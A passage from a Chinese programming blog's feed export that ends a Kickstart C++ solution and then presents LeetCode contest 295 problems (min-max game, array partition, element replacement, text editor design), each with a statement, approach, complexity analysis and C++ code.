class="keyword">if</span>(L &gt; R) &#123;</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// debug() &lt;&lt; imie(L);</span></span><br><span class="line">	<span class="built_in">assert</span>(s[L] == <span class="string">&#x27;+&#x27;</span> || s[L] == <span class="string">&#x27;*&#x27;</span> || s[L] == <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">	<span class="type">int</span> b = <span class="built_in">rec</span>(L + <span class="number">1</span>, R);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">merge</span>(a, b, s[L]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_case</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mapping;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">		<span class="type">int</span> value = <span class="built_in">rec</span>(<span class="number">0</span>, (<span class="type">int</span>) <span class="built_in">strlen</span>(s) - <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span>(mapping.<span class="built_in">find</span>(value) == mapping.<span class="built_in">end</span>()) &#123;</span><br><span class="line">			<span class="type">int</span> nxt = mapping.<span class="built_in">size</span>();</span><br><span class="line">			nxt++;</span><br><span class="line">			mapping[value] = nxt;</span><br><span class="line">		&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, mapping[value]);</span><br><span class="line">		<span class="comment">// debug() &lt;&lt; imie(value);</span></span><br><span class="line">	&#125;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> T;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> z = <span class="number">1</span>; z &lt;= T; z++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Case #%d:&quot;</span>, z);</span><br><span class="line">		<span class="built_in">test_case</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 295</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/7/</url>
    <content><![CDATA[<h2 id="leetcode-contest-295"><a href="#leetcode-contest-295" class="headerlink" title="leetcode  contest 295"></a>leetcode  contest 295</h2><p>最后一题感觉不是很难，但是还是挺有意思的一道设计题目，比较有新意，前三题基本都是水题了。</p>
<h3 id="6090-极大极小游戏"><a href="#6090-极大极小游戏" class="headerlink" title="6090. 极大极小游戏"></a>6090. 极大极小游戏</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从<code> 0</code> 开始的整数数组 <code>nums</code> ，其长度是 <code>2</code> 的幂。</p>
<p>对 <code>nums</code> 执行下述算法：</p>
<p>设 <code>n</code> 等于 <code>nums</code> 的长度，如果 <code>n == 1 </code>，终止 算法过程。否则，创建 一个新的整数数组 <code>newNums</code> ，新数组长度为 <code>n / 2</code> ，下标从 <code>0</code> 开始。</p>
<ul>
<li>对于满足<code> 0 &lt;= i &lt; n / 2</code> 的每个 偶数 下标 <code>i</code> ，将 <code>newNums[i]</code> 赋值 为 min(nums[2 * i], nums[2 * i + 1]) 。</li>
<li>对于满足<code> 0 &lt;= i &lt; n / 2</code> 的每个 奇数 下标 <code>i</code> ，将 <code>newNums[i]</code> 赋值 为 max(nums[2 * i], nums[2 * i + 1]) 。</li>
<li>用 <code>newNums</code> 替换 <code>nums</code> 。<br>从步骤 <code>1</code> 开始 重复 整个过程。<br>执行算法后，返回 <code>nums</code> 中剩下的那个数字。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,5,2,4,8,2,2]</span><br><span class="line">输出：1</span><br><span class="line">解释：重复执行算法会得到下述数组。</span><br><span class="line">第一轮：nums = [1,5,4,2]</span><br><span class="line">第二轮：nums = [1,4]</span><br><span class="line">第三轮：nums = [1]</span><br><span class="line">1 是最后剩下的那个数字，返回 1 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3]</span><br><span class="line">输出：3</span><br><span class="line">解释：3 就是最后剩下的数字，返回 3 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1024</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
<li><code>nums.length</code> 是 <code>2</code> 的幂</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/min-max-game">https://leetcode.cn/problems/min-max-game</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟即可
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于数组的长度是 $2$ 的幂， 我们直接模拟即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(2n)$, 其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMaxGame</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(nums.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((i % <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    arr.<span class="built_in">emplace_back</span>(<span class="built_in">min</span>(nums[i * <span class="number">2</span>], nums[<span class="number">2</span> * i + <span class="number">1</span>]));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    arr.<span class="built_in">emplace_back</span>(<span class="built_in">max</span>(nums[i * <span class="number">2</span>], nums[<span class="number">2</span> * i + <span class="number">1</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            nums = arr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6091-划分数组使最大差为-K"><a href="#6091-划分数组使最大差为-K" class="headerlink" title="6091. 划分数组使最大差为 K"></a>6091. 划分数组使最大差为 K</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> 。你可以将 <code>nums</code> 划分成一个或多个 子序列 ，使 <code>nums</code> 中的每个元素都 恰好 出现在一个子序列中。</p>
<p>在满足每个子序列中最大值和最小值之间的差值最多为 <code>k</code> 的前提下，返回需要划分的 最少 子序列数目。</p>
<p>子序列 本质是一个序列，可以通过删除另一个序列中的某些元素（或者不删除）但不改变剩下元素的顺序得到。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,6,1,2,5], k = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">可以将 nums 划分为两个子序列 [3,1,2] 和 [6,5] 。</span><br><span class="line">第一个子序列中最大值和最小值的差值是 3 - 1 = 2 。</span><br><span class="line">第二个子序列中最大值和最小值的差值是 6 - 5 = 1 。</span><br><span class="line">由于创建了两个子序列，返回 2 。可以证明需要划分的最少子序列数目就是 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3], k = 1</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">可以将 nums 划分为两个子序列 [1,2] 和 [3] 。</span><br><span class="line">第一个子序列中最大值和最小值的差值是 2 - 1 = 1 。</span><br><span class="line">第二个子序列中最大值和最小值的差值是 3 - 3 = 0 。</span><br><span class="line">由于创建了两个子序列，返回 2 。注意，另一种最优解法是将 nums 划分成子序列 [1] 和 [2,3] 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,2,4,5], k = 0</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">可以将 nums 划分为三个子序列 [2,2]、[4] 和 [5] 。</span><br><span class="line">第一个子序列中最大值和最小值的差值是 2 - 2 = 0 。</span><br><span class="line">第二个子序列中最大值和最小值的差值是 4 - 4 = 0 。</span><br><span class="line">第三个子序列中最大值和最小值的差值是 5 - 5 = 0 。</span><br><span class="line">由于创建了三个子序列，返回 3 。可以证明需要划分的最少子序列数目就是 3 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>0 &lt;= nums[i] &lt;= 105</code></li>
<li><code>0 &lt;= k &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/partition-array-such-that-maximum-difference-is-k">https://leetcode.cn/problems/partition-array-such-that-maximum-difference-is-k</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>首先将数组排序，此时我们可以知道对于数组中最大的数 $nums[n-1]$, 此时包含 $nums[n-1]$ 的分组中最小的数只能为 $nums[n-1] - k$, 此时我们将区间 $[nums[n-1]-k, nums[n-1]]$ 划分为一组，然后再依次按照从大到小进行划分，再从剩余的分组中挑选最大的元素，然后依次换分即可。当然我们从最小的元素开始划分也可以。此时我们即可求出最大的分组数目。</li>
<li>具体分组时，我们可以使用二分查找或者双指针均可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partitionArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> last = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(last &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">lower_bound</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), nums[last] - k) - nums.<span class="built_in">begin</span>();</span><br><span class="line">            <span class="keyword">if</span> (x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                last = x - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>双指针<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partitionArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> last = nums[n - <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (last - nums[i] &gt; k) &#123;</span><br><span class="line">                last = nums[i];</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6092-替换数组中的元素"><a href="#6092-替换数组中的元素" class="headerlink" title="6092. 替换数组中的元素"></a>6092. 替换数组中的元素</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的数组 <code>nums</code> ，它包含 <code>n</code> 个 互不相同 的正整数。请你对这个数组执行 <code>m</code> 个操作，在第 <code>i</code> 个操作中，你需要将数字 <code>operations[i][0]</code> 替换成 <code>operations[i][1]</code> 。</p>
<p>题目保证在第 <code>i</code> 个操作中：</p>
<ul>
<li><code>operations[i][0]</code> 在 <code>nums</code> 中存在。</li>
<li><code>operations[i][1]</code> 在 <code>nums</code> 中不存在。<br>请你返回执行完所有操作后的数组。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,4,6], operations = [[1,3],[4,7],[6,1]]</span><br><span class="line">输出：[3,2,7,1]</span><br><span class="line">解释：我们对 nums 执行以下操作：</span><br><span class="line">- 将数字 1 替换为 3 。nums 变为 [3,2,4,6] 。</span><br><span class="line">- 将数字 4 替换为 7 。nums 变为 [3,2,7,6] 。</span><br><span class="line">- 将数字 6 替换为 1 。nums 变为 [3,2,7,1] 。</span><br><span class="line">返回最终数组 [3,2,7,1] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2], operations = [[1,3],[2,1],[3,2]]</span><br><span class="line">输出：[2,1]</span><br><span class="line">解释：我们对 nums 执行以下操作：</span><br><span class="line">- 将数字 1 替换为 3 。nums 变为 [3,2] 。</span><br><span class="line">- 将数字 2 替换为 1 。nums 变为 [3,1] 。</span><br><span class="line">- 将数字 3 替换为 2 。nums 变为 [2,1] 。</span><br><span class="line">返回最终数组 [2,1] 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>m == operations.length</code></li>
<li><code>1 &lt;= n, m &lt;= 105</code></li>
<li><code>nums</code> 中所有数字 互不相同 。</li>
<li><code>operations[i].length == 2</code></li>
<li><code>1 &lt;= nums[i], operations[i][0], operations[i][1] &lt;= 106</code></li>
<li>在执行第 <code>i</code> 个操作时，<code>operations[i][0]</code> 在 <code>nums</code> 中存在。</li>
<li>在执行第 <code>i</code> 个操作时，<code>operations[i][1]</code> 在 <code>nums</code> 中不存在。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/replace-elements-in-an-array">https://leetcode.cn/problems/replace-elements-in-an-array</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>hash统计
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>将数组中所有相同的元素索引进行分组，并对分组后的索引进行编号，利用 <code>hash</code> 统计将每个元素映射到分组的编号。</li>
<li>我们进行替换时，将新元素映射到旧元素的索引编号上，同时删除旧的元素即可，最后恢复原始的数组即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$, 其中 $n$ 为节点的数目。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为节点的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">arrayChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; operations)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt; cnt;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt; idx;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt[nums[i]].<span class="built_in">emplace_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = cnt.<span class="built_in">begin</span>(); it != cnt.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">            arr[it-&gt;first] = j;</span><br><span class="line">            idx[j] = it-&gt;second;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : operations) &#123;</span><br><span class="line">            <span class="type">int</span> x = arr[v[<span class="number">0</span>]];</span><br><span class="line">            arr.<span class="built_in">erase</span>(v[<span class="number">0</span>]);</span><br><span class="line">            arr[v[<span class="number">1</span>]] = x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [x, y] : arr) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> v : idx[y]) &#123;</span><br><span class="line">                ans[v] = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6093-设计一个文本编辑器"><a href="#6093-设计一个文本编辑器" class="headerlink" title="6093. 设计一个文本编辑器"></a>6093. 设计一个文本编辑器</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>请你设计一个带光标的文本编辑器，它可以实现以下功能：</p>
<ul>
<li>添加：在光标所在处添加文本。</li>
<li>删除：在光标所在处删除文本（模拟键盘的删除键）。</li>
<li>移动：将光标往左或者往右移动。<br>当删除文本时，只有光标左边的字符会被删除。光标会留在文本内，也就是说任意时候 <code>0 &lt;= cursor.position &lt;= currentText.length</code> 都成立。</li>
</ul>
<p>请你实现 <code>TextEditor</code> 类：</p>
<ul>
<li><code>TextEditor()</code> 用空文本初始化对象。</li>
<li><code>void addText(string text)</code> 将 <code>text</code> 添加到光标所在位置。添加完后光标在 text 的右边。</li>
<li><code>int deleteText(int k)</code> 删除光标左边 <code>k</code> 个字符。返回实际删除的字符数目。</li>
<li><code>string cursorLeft(int k)</code> 将光标向左移动 <code>k</code> 次。返回移动后光标左边 <code>min(10, len)</code> 个字符，其中 <code>len</code> 是光标左边的字符数目。</li>
<li><code>string cursorRight(int k)</code> 将光标向右移动 <code>k</code> 次。返回移动后光标左边 <code>min(10, len)</code> 个字符，其中 <code>len</code> 是光标左边的字符数目。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;TextEditor&quot;, &quot;addText&quot;, &quot;deleteText&quot;, &quot;addText&quot;, &quot;cursorRight&quot;, &quot;cursorLeft&quot;, &quot;deleteText&quot;, &quot;cursorLeft&quot;, &quot;cursorRight&quot;]</span><br><span class="line">[[], [&quot;leetcode&quot;], [4], [&quot;practice&quot;], [3], [8], [10], [2], [6]]</span><br><span class="line">输出：</span><br><span class="line">[null, null, 4, null, &quot;etpractice&quot;, &quot;leet&quot;, 4, &quot;&quot;, &quot;practi&quot;]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">TextEditor textEditor = new TextEditor(); // 当前 text 为 &quot;|&quot; 。（&#x27;|&#x27; 字符表示光标）</span><br><span class="line">textEditor.addText(&quot;leetcode&quot;); // 当前文本为 &quot;leetcode|&quot; 。</span><br><span class="line">textEditor.deleteText(4); // 返回 4</span><br><span class="line">                          // 当前文本为 &quot;leet|&quot; 。</span><br><span class="line">                          // 删除了 4 个字符。</span><br><span class="line">textEditor.addText(&quot;practice&quot;); // 当前文本为 &quot;leetpractice|&quot; 。</span><br><span class="line">textEditor.cursorRight(3); // 返回 &quot;etpractice&quot;</span><br><span class="line">                           // 当前文本为 &quot;leetpractice|&quot;. </span><br><span class="line">                           // 光标无法移动到文本以外，所以无法移动。</span><br><span class="line">                           // &quot;etpractice&quot; 是光标左边的 10 个字符。</span><br><span class="line">textEditor.cursorLeft(8); // 返回 &quot;leet&quot;</span><br><span class="line">                          // 当前文本为 &quot;leet|practice&quot; 。</span><br><span class="line">                          // &quot;leet&quot; 是光标左边的 min(10, 4) = 4 个字符。</span><br><span class="line">textEditor.deleteText(10); // 返回 4</span><br><span class="line">                           // 当前文本为 &quot;|practice&quot; 。</span><br><span class="line">                           // 只有 4 个字符被删除了。</span><br><span class="line">textEditor.cursorLeft(2); // 返回 &quot;&quot;</span><br><span class="line">                          // 当前文本为 &quot;|practice&quot; 。</span><br><span class="line">                          // 光标无法移动到文本以外，所以无法移动。</span><br><span class="line">                          // &quot;&quot; 是光标左边的 min(10, 0) = 0 个字符。</span><br><span class="line">textEditor.cursorRight(6); // 返回 &quot;practi&quot;</span><br><span class="line">                           // 当前文本为 &quot;practi|ce&quot; 。</span><br><span class="line">                           // &quot;practi&quot; 是光标左边的 min(10, 6) = 6 个字符。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= text.length, k &lt;= 40</code></li>
<li><code>text </code>只含有小写英文字母。</li>
<li>调用 <code>addText</code> ，<code>deleteText</code> ，<code>cursorLeft</code> 和<code>cursorRight</code> 的 总 次数不超过 <code>2 * 104</code> 次。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/design-a-text-editor/">https://leetcode.cn/problems/design-a-text-editor/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>字符串
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目稍微有点意思，但是确实不需要特别复杂的技巧，我们可以分别用两个字符串 $left, right$ 来存储光标左边的字符串和右边的字符串，其中 $left$ 正序存储左边的字符串， $right$ 逆序存储右边的字符串。每次操作如下：</li>
</ol>
<ul>
<li><code>addText</code>: 此时我们只需要将左边的字符串中末尾添加 $text$ 即可。</li>
<li><code>int deleteText(int k)</code>: 直接删除 $left$ 末尾的 $k$ 个字符即可。</li>
<li><code>string cursorLeft(int k)</code>: 直接将 $left$ 末尾的 $k$ 个字符取出压入到 <code>right</code> 的末尾, 然后返回 <code>left</code> 末尾的 $10$ 个字符构成的字符串。</li>
<li><code>string cursorRight(int k)</code>：直接将 $right$ 末尾的 $k$ 个字符取出压入到 <code>left</code> 的末尾, 然后返回 <code>left</code> 末尾的 $10$ 个字符构成的字符串。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$q \times k$，其中 $q$ 表示函数的调用此时， $k$ 表示给定的参数 $k$ 。</li>
<li>空间复杂度：$O(q \times k)$, 其中 $q$ 表示函数的调用此时， $k$ 表示给定的参数 $k$ 。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TextEditor</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TextEditor</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addText</span><span class="params">(string text)</span> </span>&#123;</span><br><span class="line">        left.<span class="built_in">append</span>(text);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">deleteText</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = left.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len &amp;&amp; i &lt; k; i++) &#123;</span><br><span class="line">            left.<span class="built_in">pop_back</span>();</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">string <span class="title">cursorLeft</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = left.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len &amp;&amp; i &lt; k; i++) &#123;</span><br><span class="line">            right.<span class="built_in">push_back</span>(left.<span class="built_in">back</span>());</span><br><span class="line">            left.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        string ans;</span><br><span class="line">        len = left.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len &amp;&amp; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(left[len - i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(ans.<span class="built_in">begin</span>(), ans.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">string <span class="title">cursorRight</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = right.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len &amp;&amp; i &lt; k; i++) &#123;</span><br><span class="line">            left.<span class="built_in">push_back</span>(right.<span class="built_in">back</span>());</span><br><span class="line">            right.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        string ans;</span><br><span class="line">        len = left.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len &amp;&amp; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(left[len - i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(ans.<span class="built_in">begin</span>(), ans.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string left;</span><br><span class="line">    string right;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

